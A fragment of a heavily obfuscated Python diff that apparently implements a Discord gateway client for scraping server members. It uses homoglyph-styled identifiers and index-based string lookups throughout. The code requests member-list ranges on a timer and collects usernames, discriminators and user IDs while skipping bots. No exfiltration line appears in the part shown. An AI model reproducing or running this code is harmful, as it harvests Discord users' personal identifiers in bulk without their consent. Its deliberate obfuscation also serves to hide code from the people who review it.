-        if 𝙙𝗲𝘤𝙤𝗱𝘦𝗱[𝘕𝙈𝙈𝗠𝗡𝗹𝘭𝗠𝘔𝘭𝘔𝗠𝘕𝙡𝘐𝙈𝘐𝙄𝘕𝙈𝗜𝗜𝙈𝙄𝗹𝗜𝘕𝙄𝘔𝙄𝘐𝙈[207]] == 𝗡𝙈𝙈𝘔𝙉𝗹𝙡𝘔𝗠𝙡𝙈𝙈𝙉𝘭𝘐𝘔𝙄𝗜𝘕𝙈𝙄𝗜𝘔𝙄𝗹𝙄𝙉𝙄𝘔𝙄𝙄𝗠[208]:
-            for 𝙜𝘶𝘪𝘭𝗱 in 𝗱𝗲𝘤𝘰𝘥𝘦𝙙[𝙉𝙈𝗠𝗠𝙉𝘭𝙡𝘔𝗠𝙡𝙈𝘔𝙉𝙡𝗜𝙈𝘐𝗜𝙉𝘔𝙄𝗜𝘔𝙄𝗹𝘐𝘕𝙄𝗠𝙄𝗜𝙈[173]][𝘕𝘔𝘔𝗠𝙉𝙡𝘭𝗠𝗠𝙡𝙈𝗠𝗡𝘭𝗜𝙈𝘐𝘐𝙉𝙈𝗜𝗜𝗠𝙄𝘭𝙄𝗡𝘐𝙈𝙄𝘐𝙈[209]]:
-                𝘀𝙚𝙡𝗳.guilds[𝗴𝘶𝙞𝙡𝗱[𝘕𝙈𝗠𝙈𝘕𝘭𝗹𝘔𝙈𝗹𝗠𝙈𝘕𝘭𝘐𝘔𝙄𝙄𝙉𝘔𝘐𝙄𝗠𝘐𝗹𝘐𝗡𝙄𝙈𝗜𝘐𝗠[167]]] = {𝘕𝘔𝘔𝘔𝘕𝗹𝘭𝘔𝗠𝙡𝙈𝗠𝘕𝘭𝙄𝙈𝘐𝙄𝗡𝗠𝙄𝘐𝗠𝗜𝘭𝙄𝙉𝘐𝘔𝙄𝘐𝘔[166]: 𝗴𝘶𝙞𝗹𝗱[𝙉𝘔𝘔𝙈𝙉𝘭𝙡𝗠𝘔𝘭𝙈𝗠𝘕𝘭𝘐𝘔𝙄𝙄𝘕𝙈𝗜𝗜𝘔𝗜𝙡𝙄𝘕𝗜𝙈𝘐𝗜𝗠[166]]}
-        if 𝙙𝗲𝙘𝘰𝘥𝙚𝘥[𝘕𝙈𝙈𝗠𝘕𝗹𝘭𝗠𝙈𝘭𝗠𝗠𝘕𝗹𝙄𝙈𝗜𝗜𝙉𝗠𝗜𝘐𝗠𝗜𝗹𝙄𝘕𝘐𝗠𝗜𝘐𝘔[207]] == 𝗡𝗠𝘔𝘔𝙉𝗹𝘭𝗠𝗠𝙡𝗠𝗠𝙉𝗹𝗜𝘔𝘐𝙄𝙉𝗠𝗜𝙄𝘔𝙄𝙡𝗜𝙉𝘐𝙈𝗜𝘐𝗠[210]:
-            𝘀𝘦𝘁𝘢𝘁𝙩𝙧(𝘴𝙚𝗹𝙛, 'ranges', 𝗨𝘵𝙞𝘭𝙨.getRanges(0, 100, 𝙨𝙚𝙡𝗳.guilds[𝙨𝘦𝘭𝙛.guild_id][𝙉𝙈𝗠𝗠𝘕𝗹𝙡𝘔𝗠𝙡𝗠𝗠𝘕𝙡𝙄𝗠𝗜𝙄𝙉𝙈𝙄𝗜𝙈𝗜𝗹𝙄𝙉𝗜𝗠𝘐𝙄𝘔[166]]))
-            𝙨𝙚𝘭𝗳.scrapeUsers()
-        elif 𝙙𝗲𝗰𝘰𝗱𝙚𝘥[𝗡𝙈𝗠𝙈𝘕𝙡𝘭𝗠𝗠𝘭𝗠𝙈𝗡𝘭𝘐𝙈𝗜𝙄𝘕𝘔𝘐𝘐𝗠𝙄𝗹𝗜𝙉𝘐𝗠𝗜𝘐𝗠[207]] == 𝘕𝙈𝙈𝘔𝙉𝙡𝘭𝙈𝗠𝙡𝘔𝙈𝗡𝙡𝗜𝗠𝗜𝗜𝘕𝘔𝘐𝗜𝘔𝙄𝗹𝘐𝙉𝘐𝙈𝘐𝘐𝘔[211]:
-            𝗽𝘢𝗿𝘀𝙚𝙙 = 𝗨𝘁𝗶𝘭𝘀.parseGuildMemberListUpdate(𝘥𝙚𝗰𝘰𝘥𝗲𝙙)
-            if 𝙥𝙖𝙧𝘀𝗲𝘥[𝙉𝗠𝗠𝘔𝙉𝗹𝘭𝙈𝙈𝘭𝘔𝗠𝗡𝗹𝗜𝙈𝘐𝗜𝙉𝙈𝘐𝗜𝙈𝘐𝘭𝘐𝘕𝙄𝘔𝗜𝗜𝘔[168]] == 𝘀𝙚𝘭𝗳.guild_id and (𝘕𝗠𝘔𝘔𝘕𝘭𝘭𝙈𝗠𝘭𝗠𝗠𝗡𝘭𝗜𝙈𝘐𝗜𝘕𝗠𝗜𝙄𝘔𝙄𝘭𝙄𝘕𝙄𝘔𝗜𝘐𝙈[177] in 𝘱𝘢𝙧𝘴𝘦𝙙[𝙉𝗠𝘔𝗠𝘕𝘭𝙡𝗠𝗠𝘭𝘔𝗠𝗡𝘭𝙄𝗠𝗜𝗜𝙉𝙈𝘐𝙄𝙈𝗜𝗹𝗜𝘕𝙄𝘔𝗜𝙄𝙈[170]] or 𝗡𝘔𝙈𝗠𝘕𝘭𝙡𝘔𝙈𝙡𝗠𝙈𝙉𝙡𝙄𝘔𝙄𝗜𝙉𝙈𝗜𝙄𝗠𝗜𝘭𝘐𝙉𝙄𝙈𝘐𝗜𝗠[182] in 𝗽𝘢𝗿𝘀𝙚𝗱[𝘕𝗠𝙈𝘔𝗡𝘭𝙡𝗠𝙈𝙡𝘔𝙈𝘕𝘭𝗜𝙈𝘐𝙄𝘕𝙈𝙄𝗜𝙈𝗜𝘭𝙄𝗡𝙄𝙈𝙄𝙄𝗠[170]]):
-                for 𝘦𝗹𝗲𝘮, 𝗶𝘯𝘥𝙚𝘹 in 𝘦𝗻𝘶𝗺𝗲𝗿𝘢𝘵𝘦(𝙥𝙖𝘳𝘀𝗲𝘥[𝘕𝗠𝘔𝙈𝗡𝙡𝗹𝗠𝘔𝘭𝘔𝙈𝗡𝙡𝗜𝙈𝙄𝗜𝘕𝗠𝘐𝙄𝘔𝗜𝘭𝘐𝘕𝗜𝘔𝗜𝘐𝙈[170]]):
-                    if 𝘪𝗻𝗱𝘦𝙭 == 𝘕𝙈𝙈𝙈𝗡𝙡𝗹𝘔𝘔𝙡𝗠𝙈𝗡𝗹𝗜𝗠𝗜𝗜𝙉𝗠𝗜𝗜𝗠𝗜𝘭𝘐𝙉𝘐𝘔𝗜𝙄𝗠[177]:
-                        if 𝘭𝘦𝘯(𝙥𝗮𝙧𝙨𝙚𝙙[𝘕𝘔𝙈𝙈𝙉𝘭𝗹𝘔𝘔𝗹𝗠𝙈𝘕𝘭𝗜𝘔𝗜𝙄𝙉𝙈𝗜𝙄𝙈𝗜𝘭𝗜𝙉𝘐𝗠𝗜𝙄𝗠[172]][𝙚𝘭𝗲𝘮]) == 0:
-                            𝙨𝙚𝘵𝗮𝙩𝘵𝙧(𝙨𝘦𝘭𝙛, 'endScraping', True)
+        if 𝗱𝗲𝙘𝗼𝗱𝗲𝘥[𝘐𝘕𝘐𝘕𝙡𝙡𝘐𝙈𝙄𝘐𝙡𝘔𝗹𝙡𝙄𝗹𝗹𝙉𝗡𝗜𝙡𝘭𝘔𝘕𝙡𝘕𝙡𝗠𝙄𝙈𝗜𝘔[169]] != 11:
+            𝙨𝙚𝙡𝘧.packets_recv += 1
+        if 𝙙𝘦𝙘𝙤𝘥𝘦𝙙[𝗜𝙉𝗜𝙉𝙡𝘭𝘐𝗠𝙄𝗜𝙡𝗠𝙡𝗹𝙄𝗹𝗹𝙉𝘕𝙄𝘭𝙡𝗠𝘕𝗹𝗡𝘭𝗠𝗜𝙈𝘐𝙈[169]] == 10:
+            𝘁𝙝𝙧𝗲𝙖𝘥𝘪𝗻𝗴.Thread(target=𝙨𝘦𝗹𝘧.heartbeatThread, args=(𝗱𝘦𝙘𝙤𝗱𝗲𝗱[𝙄𝗡𝘐𝘕𝙡𝗹𝗜𝙈𝘐𝙄𝗹𝘔𝙡𝘭𝗜𝙡𝙡𝙉𝙉𝗜𝙡𝙡𝗠𝗡𝙡𝗡𝘭𝙈𝗜𝘔𝘐𝙈[166]][𝙄𝘕𝗜𝗡𝙡𝙡𝘐𝘔𝙄𝘐𝗹𝙈𝘭𝘭𝙄𝗹𝙡𝘕𝗡𝙄𝗹𝙡𝘔𝙉𝙡𝘕𝗹𝗠𝗜𝗠𝗜𝗠[199]] / 1000,), daemon=True).start()
+        if 𝘥𝙚𝘤𝗼𝘥𝙚𝗱[𝙄𝙉𝙄𝘕𝘭𝙡𝗜𝗠𝙄𝙄𝘭𝘔𝗹𝙡𝘐𝘭𝙡𝘕𝘕𝙄𝗹𝙡𝘔𝘕𝙡𝙉𝗹𝙈𝘐𝗠𝘐𝗠[200]] == 𝘐𝘕𝗜𝙉𝘭𝗹𝘐𝗠𝙄𝙄𝙡𝗠𝘭𝗹𝗜𝗹𝘭𝗡𝙉𝘐𝘭𝗹𝙈𝙉𝙡𝘕𝘭𝙈𝙄𝘔𝙄𝗠[201]:
+            for 𝗴𝘶𝙞𝗹𝙙 in 𝗱𝗲𝘤𝙤𝗱𝙚𝘥[𝙄𝗡𝙄𝙉𝗹𝙡𝘐𝗠𝗜𝗜𝗹𝙈𝘭𝗹𝗜𝘭𝙡𝙉𝗡𝙄𝙡𝘭𝗠𝗡𝘭𝗡𝙡𝗠𝙄𝘔𝙄𝙈[166]][𝘐𝘕𝙄𝗡𝗹𝙡𝙄𝙈𝘐𝗜𝙡𝘔𝗹𝘭𝘐𝘭𝘭𝘕𝗡𝗜𝘭𝗹𝗠𝘕𝗹𝗡𝘭𝗠𝙄𝙈𝘐𝘔[202]]:
+                𝘴𝘦𝘭𝙛.guilds[𝗴𝘶𝘪𝙡𝘥[𝙄𝘕𝗜𝙉𝗹𝘭𝗜𝗠𝘐𝙄𝘭𝗠𝗹𝙡𝘐𝗹𝙡𝗡𝙉𝙄𝗹𝙡𝗠𝗡𝗹𝙉𝙡𝗠𝗜𝘔𝘐𝙈[160]]] = {𝘐𝗡𝘐𝙉𝗹𝙡𝘐𝙈𝙄𝗜𝗹𝘔𝗹𝘭𝙄𝘭𝙡𝗡𝙉𝗜𝘭𝘭𝗠𝗡𝙡𝘕𝗹𝗠𝙄𝙈𝘐𝙈[159]: 𝙜𝘶𝗶𝘭𝗱[𝗜𝗡𝘐𝘕𝘭𝘭𝗜𝗠𝘐𝗜𝘭𝙈𝘭𝘭𝙄𝗹𝗹𝗡𝘕𝙄𝗹𝗹𝗠𝘕𝘭𝘕𝗹𝙈𝙄𝘔𝙄𝙈[159]]}
+        if 𝗱𝙚𝙘𝘰𝗱𝗲𝙙[𝗜𝘕𝘐𝙉𝙡𝗹𝙄𝗠𝘐𝘐𝘭𝘔𝗹𝙡𝙄𝘭𝗹𝗡𝙉𝘐𝘭𝘭𝗠𝗡𝗹𝘕𝗹𝙈𝙄𝙈𝗜𝙈[200]] == 𝙄𝙉𝗜𝗡𝘭𝗹𝘐𝗠𝙄𝘐𝘭𝘔𝗹𝗹𝘐𝘭𝗹𝗡𝘕𝙄𝗹𝘭𝙈𝘕𝙡𝙉𝘭𝘔𝗜𝗠𝗜𝗠[203]:
+            𝘴𝘦𝘁𝙖𝘁𝙩𝙧(𝘀𝙚𝗹𝗳, 'ranges', 𝘜𝙩𝗶𝗹𝘴.getRanges(0, 100, 𝘴𝗲𝙡𝙛.guilds[𝙨𝙚𝙡𝘧.guild_id][𝗜𝙉𝙄𝗡𝘭𝘭𝙄𝘔𝙄𝙄𝘭𝘔𝙡𝘭𝘐𝘭𝙡𝙉𝘕𝙄𝗹𝘭𝗠𝙉𝗹𝘕𝘭𝗠𝗜𝗠𝗜𝘔[159]]))
+            𝘴𝗲𝙡𝙛.scrapeUsers()
+        elif 𝙙𝗲𝗰𝘰𝘥𝗲𝗱[𝙄𝗡𝘐𝗡𝗹𝘭𝘐𝘔𝘐𝙄𝙡𝗠𝙡𝘭𝗜𝘭𝗹𝙉𝙉𝗜𝘭𝗹𝗠𝗡𝘭𝙉𝗹𝗠𝙄𝗠𝘐𝙈[200]] == 𝘐𝘕𝙄𝙉𝙡𝘭𝙄𝙈𝙄𝗜𝗹𝘔𝙡𝘭𝙄𝘭𝘭𝘕𝙉𝘐𝙡𝘭𝙈𝙉𝘭𝙉𝗹𝙈𝙄𝙈𝙄𝙈[204]:
+            𝙥𝘢𝘳𝘀𝗲𝗱 = 𝗨𝙩𝗶𝙡𝘀.parseGuildMemberListUpdate(𝘥𝙚𝗰𝘰𝗱𝘦𝙙)
+            if 𝙥𝗮𝗿𝘀𝗲𝗱[𝙄𝘕𝙄𝗡𝙡𝘭𝙄𝗠𝗜𝙄𝗹𝗠𝗹𝘭𝘐𝗹𝘭𝙉𝘕𝙄𝗹𝙡𝘔𝗡𝗹𝘕𝘭𝗠𝙄𝗠𝙄𝙈[161]] == 𝘀𝗲𝘭𝘧.guild_id and (𝘐𝘕𝘐𝙉𝘭𝙡𝙄𝗠𝙄𝗜𝗹𝘔𝙡𝙡𝗜𝘭𝙡𝙉𝗡𝙄𝙡𝙡𝙈𝗡𝗹𝙉𝘭𝙈𝙄𝘔𝗜𝘔[170] in 𝘱𝙖𝗿𝙨𝘦𝙙[𝙄𝙉𝘐𝗡𝙡𝗹𝘐𝙈𝗜𝗜𝘭𝘔𝗹𝘭𝘐𝗹𝘭𝗡𝘕𝙄𝗹𝗹𝙈𝗡𝗹𝗡𝙡𝘔𝘐𝗠𝘐𝘔[163]] or 𝙄𝗡𝗜𝙉𝘭𝗹𝘐𝘔𝗜𝙄𝘭𝘔𝙡𝗹𝗜𝘭𝗹𝗡𝗡𝘐𝙡𝘭𝗠𝗡𝘭𝙉𝗹𝙈𝙄𝙈𝗜𝗠[175] in 𝗽𝗮𝗿𝘀𝙚𝙙[𝗜𝗡𝗜𝙉𝗹𝘭𝙄𝗠𝗜𝙄𝗹𝘔𝙡𝗹𝙄𝗹𝘭𝗡𝘕𝗜𝗹𝘭𝙈𝘕𝘭𝘕𝙡𝙈𝘐𝙈𝘐𝗠[163]]):
+                for 𝙚𝗹𝙚𝗺, 𝙞𝗻𝗱𝙚𝘹 in 𝙚𝙣𝘂𝘮𝙚𝙧𝗮𝘁𝗲(𝗽𝗮𝙧𝙨𝙚𝘥[𝗜𝘕𝙄𝘕𝙡𝙡𝙄𝙈𝙄𝙄𝗹𝙈𝗹𝗹𝗜𝘭𝘭𝙉𝙉𝘐𝘭𝙡𝙈𝙉𝙡𝙉𝙡𝗠𝘐𝘔𝙄𝘔[163]]):
+                    if 𝘪𝗻𝗱𝗲𝙭 == 𝗜𝗡𝙄𝙉𝘭𝙡𝗜𝘔𝘐𝗜𝙡𝙈𝗹𝘭𝙄𝙡𝗹𝙉𝘕𝙄𝘭𝙡𝙈𝗡𝙡𝗡𝘭𝙈𝗜𝙈𝘐𝙈[170]:
+                        if 𝘭𝘦𝘯(𝗽𝙖𝗿𝘴𝗲𝘥[𝗜𝗡𝘐𝗡𝗹𝗹𝘐𝙈𝘐𝗜𝘭𝗠𝙡𝘭𝘐𝗹𝘭𝙉𝘕𝗜𝘭𝙡𝙈𝗡𝙡𝘕𝘭𝙈𝗜𝙈𝗜𝘔[165]][𝙚𝘭𝗲𝙢]) == 0:
+                            𝙨𝙚𝘵𝙖𝘵𝙩𝙧(𝙨𝗲𝙡𝗳, 'endScraping', True)
                             break
-                        for 𝘪𝙩𝙚𝙢 in 𝗽𝙖𝙧𝘀𝙚𝘥[𝘕𝗠𝘔𝙈𝙉𝗹𝙡𝗠𝙈𝘭𝙈𝘔𝗡𝘭𝘐𝙈𝘐𝘐𝙉𝙈𝙄𝗜𝙈𝙄𝘭𝙄𝗡𝙄𝙈𝙄𝙄𝘔[172]][𝙚𝙡𝙚𝘮]:
-                            if 𝘕𝘔𝗠𝙈𝘕𝙡𝗹𝗠𝗠𝗹𝙈𝗠𝗡𝙡𝗜𝘔𝙄𝗜𝘕𝙈𝙄𝘐𝘔𝙄𝘭𝘐𝙉𝙄𝗠𝗜𝙄𝗠[212] in 𝘪𝘵𝙚𝗺:
-                                𝘮𝙚𝘮 = 𝗶𝘵𝘦𝗺[𝙉𝗠𝘔𝘔𝙉𝗹𝙡𝘔𝙈𝘭𝙈𝗠𝗡𝙡𝗜𝘔𝙄𝘐𝗡𝗠𝘐𝗜𝙈𝙄𝗹𝙄𝙉𝙄𝘔𝗜𝘐𝙈[212]]
-                                𝘰𝘣𝘫 = {𝗡𝗠𝙈𝗠𝗡𝘭𝗹𝗠𝘔𝗹𝘔𝗠𝙉𝗹𝗜𝗠𝗜𝙄𝙉𝗠𝗜𝗜𝙈𝗜𝘭𝗜𝙉𝙄𝘔𝗜𝘐𝘔[213]: 𝘮𝗲𝗺[𝗡𝗠𝘔𝘔𝙉𝗹𝘭𝙈𝗠𝙡𝘔𝘔𝘕𝘭𝗜𝘔𝘐𝘐𝘕𝙈𝘐𝗜𝙈𝙄𝘭𝗜𝘕𝗜𝗠𝗜𝗜𝗠[214]][𝗡𝙈𝙈𝙈𝘕𝘭𝙡𝗠𝘔𝗹𝘔𝙈𝘕𝙡𝗜𝗠𝘐𝙄𝙉𝗠𝗜𝘐𝗠𝗜𝘭𝘐𝗡𝘐𝘔𝘐𝘐𝙈[215]] + 𝗡𝘔𝘔𝙈𝙉𝙡𝘭𝙈𝙈𝘭𝘔𝘔𝘕𝙡𝙄𝙈𝘐𝙄𝗡𝗠𝘐𝙄𝗠𝘐𝘭𝘐𝙉𝗜𝘔𝙄𝙄𝗠[216] + 𝙢𝙚𝙢[𝘕𝙈𝙈𝙈𝗡𝗹𝘭𝙈𝗠𝗹𝗠𝘔𝘕𝘭𝗜𝗠𝙄𝘐𝘕𝗠𝗜𝙄𝙈𝗜𝗹𝘐𝙉𝘐𝙈𝘐𝘐𝙈[214]][𝗡𝗠𝙈𝙈𝘕𝗹𝗹𝗠𝙈𝘭𝙈𝗠𝗡𝗹𝙄𝙈𝗜𝗜𝘕𝗠𝘐𝙄𝙈𝗜𝗹𝘐𝙉𝘐𝙈𝙄𝘐𝘔[217]], 𝘕𝘔𝙈𝙈𝘕𝗹𝘭𝘔𝙈𝘭𝘔𝗠𝗡𝗹𝘐𝗠𝘐𝗜𝗡𝘔𝘐𝙄𝘔𝗜𝘭𝙄𝙉𝘐𝘔𝗜𝘐𝘔[167]: 𝙢𝗲𝗺[𝗡𝙈𝙈𝘔𝙉𝘭𝙡𝘔𝘔𝘭𝗠𝗠𝙉𝗹𝗜𝙈𝘐𝙄𝗡𝗠𝘐𝗜𝘔𝙄𝘭𝙄𝗡𝙄𝗠𝘐𝘐𝙈[214]][𝙉𝘔𝙈𝘔𝙉𝘭𝘭𝘔𝗠𝙡𝗠𝙈𝘕𝘭𝗜𝗠𝗜𝘐𝗡𝘔𝗜𝘐𝙈𝘐𝘭𝙄𝙉𝙄𝘔𝗜𝙄𝙈[167]]}
-                                if not 𝘮𝙚𝗺[𝙉𝙈𝙈𝙈𝙉𝘭𝗹𝗠𝙈𝗹𝘔𝘔𝘕𝙡𝗜𝗠𝙄𝙄𝘕𝗠𝘐𝗜𝘔𝗜𝗹𝘐𝗡𝙄𝗠𝗜𝙄𝗠[214]].get(𝘕𝗠𝙈𝘔𝙉𝗹𝙡𝙈𝗠𝙡𝗠𝙈𝘕𝘭𝗜𝘔𝗜𝗜𝗡𝘔𝙄𝘐𝙈𝘐𝗹𝘐𝘕𝙄𝗠𝗜𝘐𝙈[218]):
-                                    𝙨𝗲𝗹𝙛.members[𝘮𝙚𝗺[𝘕𝙈𝘔𝘔𝗡𝘭𝗹𝗠𝙈𝘭𝙈𝗠𝗡𝙡𝗜𝘔𝙄𝙄𝘕𝗠𝘐𝙄𝗠𝙄𝘭𝘐𝘕𝘐𝗠𝗜𝙄𝗠[214]][𝗡𝗠𝘔𝘔𝘕𝙡𝘭𝘔𝗠𝙡𝗠𝙈𝙉𝘭𝙄𝗠𝗜𝙄𝗡𝙈𝗜𝘐𝙈𝗜𝙡𝘐𝗡𝙄𝗠𝙄𝗜𝗠[167]]] = 𝙤𝘣𝘫
-                    elif 𝙞𝗻𝗱𝘦𝙭 == 𝗡𝗠𝙈𝗠𝘕𝘭𝙡𝙈𝗠𝗹𝙈𝙈𝙉𝘭𝙄𝙈𝙄𝗜𝙉𝘔𝗜𝘐𝙈𝘐𝘭𝗜𝙉𝗜𝗠𝙄𝗜𝗠[182]:
-                        for 𝗶𝘁𝗲𝙢 in 𝗽𝙖𝙧𝘀𝙚𝗱[𝗡𝙈𝗠𝗠𝙉𝙡𝙡𝘔𝗠𝗹𝘔𝘔𝙉𝘭𝙄𝗠𝙄𝙄𝗡𝘔𝙄𝘐𝙈𝗜𝘭𝗜𝗡𝘐𝗠𝘐𝙄𝙈[172]][𝗲𝙡𝙚𝙢]:
-                            if 𝗡𝘔𝗠𝙈𝗡𝙡𝗹𝗠𝘔𝘭𝗠𝙈𝘕𝘭𝘐𝗠𝗜𝗜𝗡𝙈𝙄𝗜𝙈𝙄𝙡𝙄𝗡𝙄𝗠𝘐𝘐𝘔[212] in 𝗶𝙩𝙚𝗺:
-                                𝘮𝙚𝘮 = 𝗶𝙩𝗲𝘮[𝘕𝙈𝙈𝘔𝙉𝗹𝘭𝙈𝙈𝙡𝙈𝘔𝗡𝙡𝘐𝙈𝙄𝙄𝘕𝗠𝙄𝗜𝘔𝗜𝘭𝘐𝘕𝙄𝙈𝙄𝘐𝙈[212]]
-                                𝙤𝗯𝗷 = {𝘕𝗠𝙈𝙈𝙉𝘭𝙡𝗠𝘔𝗹𝙈𝙈𝙉𝗹𝗜𝙈𝘐𝙄𝗡𝙈𝘐𝙄𝙈𝙄𝘭𝙄𝘕𝘐𝘔𝗜𝘐𝘔[213]: 𝙢𝙚𝗺[𝙉𝗠𝗠𝙈𝘕𝙡𝗹𝙈𝗠𝗹𝘔𝘔𝗡𝙡𝗜𝘔𝙄𝙄𝗡𝗠𝙄𝘐𝙈𝘐𝗹𝗜𝘕𝗜𝘔𝘐𝙄𝙈[214]][𝙉𝘔𝗠𝙈𝙉𝙡𝙡𝘔𝘔𝗹𝘔𝙈𝘕𝗹𝙄𝗠𝗜𝘐𝘕𝘔𝗜𝙄𝙈𝙄𝙡𝘐𝘕𝙄𝘔𝘐𝙄𝙈[215]] + 𝙉𝘔𝗠𝗠𝙉𝘭𝗹𝙈𝘔𝙡𝘔𝘔𝙉𝘭𝗜𝙈𝙄𝘐𝙉𝘔𝙄𝗜𝙈𝗜𝙡𝗜𝗡𝗜𝗠𝙄𝘐𝘔[216] + 𝙢𝘦𝘮[𝘕𝘔𝗠𝗠𝗡𝙡𝙡𝘔𝙈𝙡𝗠𝙈𝘕𝙡𝘐𝘔𝗜𝘐𝗡𝘔𝘐𝙄𝙈𝗜𝘭𝗜𝗡𝙄𝗠𝗜𝗜𝙈[214]][𝙉𝘔𝗠𝙈𝙉𝗹𝘭𝙈𝙈𝙡𝙈𝙈𝘕𝘭𝗜𝘔𝘐𝙄𝙉𝘔𝗜𝘐𝙈𝙄𝘭𝙄𝘕𝘐𝙈𝗜𝙄𝘔[217]], 𝙉𝘔𝗠𝘔𝘕𝙡𝗹𝗠𝗠𝘭𝙈𝘔𝙉𝗹𝗜𝘔𝘐𝗜𝘕𝙈𝘐𝗜𝗠𝘐𝗹𝙄𝗡𝗜𝙈𝙄𝘐𝙈[167]: 𝗺𝘦𝘮[𝗡𝙈𝘔𝙈𝙉𝗹𝙡𝘔𝗠𝗹𝘔𝙈𝗡𝘭𝘐𝙈𝗜𝘐𝗡𝘔𝗜𝗜𝘔𝙄𝘭𝘐𝗡𝙄𝗠𝗜𝘐𝘔[214]][𝗡𝘔𝘔𝙈𝗡𝗹𝘭𝗠𝘔𝘭𝙈𝗠𝗡𝘭𝙄𝗠𝘐𝗜𝗡𝘔𝗜𝘐𝘔𝘐𝘭𝗜𝘕𝙄𝙈𝘐𝗜𝘔[167]]}
-                                if not 𝙢𝗲𝘮[𝗡𝘔𝙈𝙈𝙉𝗹𝘭𝘔𝙈𝘭𝗠𝙈𝘕𝘭𝗜𝗠𝘐𝗜𝙉𝗠𝗜𝗜𝙈𝗜𝙡𝘐𝙉𝙄𝗠𝙄𝙄𝗠[214]].get(𝗡𝘔𝘔𝘔𝙉𝙡𝙡𝙈𝙈𝗹𝘔𝙈𝗡𝘭𝗜𝘔𝙄𝗜𝙉𝙈𝗜𝙄𝗠𝗜𝗹𝙄𝘕𝘐𝘔𝘐𝙄𝙈[218]):
-                                    𝘴𝙚𝗹𝘧.members[𝘮𝘦𝘮[𝙉𝗠𝘔𝙈𝗡𝗹𝙡𝙈𝙈𝘭𝙈𝙈𝘕𝘭𝘐𝘔𝗜𝙄𝘕𝙈𝗜𝘐𝘔𝙄𝗹𝗜𝙉𝙄𝙈𝙄𝘐𝗠[214]][𝙉𝗠𝙈𝘔𝗡𝗹𝙡𝙈𝘔𝘭𝘔𝘔𝙉𝗹𝘐𝗠𝘐𝙄𝘕𝙈𝘐𝗜𝘔𝙄𝗹𝙄𝗡𝘐𝙈𝙄𝙄𝙈[167]]] = 𝙤𝗯𝗷
-                    𝙨𝘦𝘭𝗳.lastRange += 1
-                    𝘀𝘦𝙩𝙖𝙩𝘵𝙧(𝘴𝗲𝙡𝙛, 'ranges', 𝗨𝙩𝘪𝙡𝘀.getRanges(𝘀𝙚𝗹𝘧.lastRange, 100, 𝘀𝘦𝘭𝙛.guilds[𝘴𝙚𝘭𝗳.guild_id][𝗡𝗠𝗠𝗠𝙉𝙡𝗹𝘔𝙈𝙡𝙈𝘔𝗡𝙡𝗜𝙈𝙄𝙄𝗡𝙈𝗜𝙄𝙈𝘐𝘭𝗜𝘕𝙄𝘔𝙄𝗜𝘔[166]]))
-                    𝘁𝘪𝗺𝘦.sleep(0.45)
-                    𝘀𝙚𝗹𝗳.scrapeUsers()
-            if 𝘀𝙚𝗹𝘧.endScraping:
-                𝙨𝙚𝗹𝙛.close()
+                        for 𝗶𝘁𝗲𝗺 in 𝗽𝘢𝗿𝘀𝘦𝗱[𝙄𝙉𝘐𝘕𝗹𝙡𝘐𝙈𝙄𝘐𝗹𝙈𝙡𝘭𝙄𝘭𝙡𝗡𝙉𝙄𝗹𝗹𝙈𝗡𝗹𝙉𝘭𝘔𝘐𝘔𝗜𝘔[165]][𝙚𝗹𝘦𝘮]:
+                            if 𝙄𝗡𝙄𝙉𝗹𝗹𝙄𝗠𝗜𝙄𝗹𝘔𝙡𝗹𝗜𝗹𝗹𝗡𝙉𝘐𝙡𝗹𝗠𝘕𝙡𝙉𝙡𝘔𝘐𝗠𝗜𝗠[205] in 𝙞𝙩𝙚𝙢:
+                                𝘮𝙚𝙢 = 𝙞𝘁𝙚𝘮[𝙄𝗡𝗜𝗡𝙡𝘭𝘐𝘔𝘐𝙄𝘭𝗠𝙡𝗹𝗜𝗹𝘭𝘕𝗡𝘐𝗹𝗹𝙈𝘕𝗹𝗡𝙡𝙈𝗜𝘔𝘐𝗠[205]]
+                                𝙤𝗯𝗷 = {𝘐𝘕𝗜𝘕𝙡𝗹𝙄𝙈𝙄𝘐𝘭𝙈𝙡𝘭𝗜𝗹𝘭𝙉𝙉𝘐𝙡𝘭𝘔𝙉𝗹𝙉𝘭𝙈𝗜𝙈𝙄𝘔[206]: 𝘮𝗲𝙢[𝘐𝙉𝘐𝗡𝙡𝙡𝘐𝘔𝗜𝙄𝙡𝘔𝘭𝘭𝙄𝘭𝙡𝙉𝙉𝗜𝘭𝘭𝙈𝘕𝗹𝙉𝗹𝙈𝗜𝙈𝗜𝙈[207]][𝙄𝗡𝘐𝘕𝘭𝙡𝙄𝗠𝙄𝙄𝗹𝙈𝙡𝙡𝘐𝙡𝗹𝙉𝘕𝙄𝘭𝘭𝘔𝘕𝙡𝗡𝙡𝗠𝙄𝘔𝙄𝙈[208]] + 𝘐𝘕𝘐𝘕𝙡𝘭𝗜𝙈𝘐𝗜𝗹𝙈𝘭𝘭𝘐𝙡𝙡𝙉𝙉𝘐𝙡𝘭𝙈𝙉𝘭𝗡𝗹𝘔𝗜𝗠𝙄𝘔[209] + 𝘮𝗲𝗺[𝙄𝙉𝙄𝗡𝘭𝗹𝙄𝗠𝗜𝙄𝙡𝗠𝗹𝗹𝗜𝙡𝘭𝙉𝗡𝗜𝙡𝙡𝙈𝗡𝘭𝙉𝗹𝙈𝘐𝗠𝗜𝗠[207]][𝗜𝙉𝗜𝗡𝗹𝘭𝘐𝘔𝗜𝗜𝙡𝙈𝘭𝗹𝘐𝗹𝙡𝙉𝙉𝗜𝗹𝘭𝘔𝗡𝗹𝗡𝗹𝙈𝙄𝗠𝗜𝗠[210]], 𝗜𝙉𝗜𝙉𝙡𝙡𝙄𝗠𝘐𝘐𝘭𝗠𝙡𝙡𝘐𝗹𝗹𝘕𝙉𝙄𝙡𝙡𝙈𝘕𝘭𝘕𝘭𝘔𝗜𝘔𝙄𝘔[160]: 𝙢𝙚𝗺[𝗜𝘕𝙄𝗡𝗹𝘭𝘐𝙈𝘐𝘐𝗹𝗠𝙡𝘭𝘐𝘭𝘭𝗡𝘕𝘐𝘭𝘭𝙈𝘕𝗹𝗡𝗹𝗠𝗜𝙈𝙄𝗠[207]][𝘐𝗡𝘐𝙉𝗹𝙡𝗜𝙈𝙄𝗜𝙡𝗠𝙡𝗹𝗜𝙡𝙡𝙉𝗡𝙄𝘭𝗹𝘔𝙉𝘭𝗡𝗹𝗠𝙄𝘔𝗜𝘔[160]]}
